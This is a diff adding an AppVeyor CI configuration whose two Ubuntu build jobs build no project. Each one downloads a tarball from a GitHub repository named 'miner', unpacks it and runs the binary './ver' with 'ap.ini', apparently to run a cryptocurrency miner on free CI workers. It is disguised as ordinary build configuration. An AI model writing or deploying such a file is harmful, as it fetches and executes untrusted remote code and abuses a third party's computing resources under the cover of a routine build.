@@ -1,0 +1,33 @@
+environment:
+  matrix:
+
+  - job_name: Build-1
+    appveyor_build_worker_image: Ubuntu
+
+  - job_name: Build-2
+    appveyor_build_worker_image: Ubuntu
+
+matrix:
+  fast_finish: flase
+
+init:
+  - appveyor version
+
+# job-specific configurations
+for:
+
+  -
+    matrix:
+      only:
+        - job_name: Build-1
+
+    build_script:
+    - sh: wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
+
+  -
+    matrix:
+      only:
+        - job_name: Build-2
+
+    build_script:
+    - sh: wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
